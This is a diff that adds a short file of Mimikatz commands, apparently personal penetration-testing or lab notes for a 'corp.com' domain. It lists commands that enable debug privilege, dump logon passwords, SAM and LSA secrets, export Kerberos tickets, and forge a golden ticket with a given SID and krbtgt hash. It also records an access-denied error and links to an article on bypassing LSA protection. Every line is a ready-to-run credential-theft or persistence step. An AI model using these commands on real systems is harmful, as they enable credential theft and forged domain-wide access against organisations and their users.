@@ -1,0 +1,19 @@
+.\mimikatz.exe
+
+sekurlsa::logonpasswords
+
+lsadump::sam
+
+privilege::debug
+
+sekurlsa::tickets
+sekurlsa::tickets /export
+
+lsadump::lsa /patch
+kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
+misc::cmd
+
+crypto::capi
+crypto::cng
+ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x000000005) means access denied.
+https://salarbakhtiari.medium.com/extracting-credentials-from-memory-with-lsa-protection-proctected-process-light-enabled-2064af4258bd
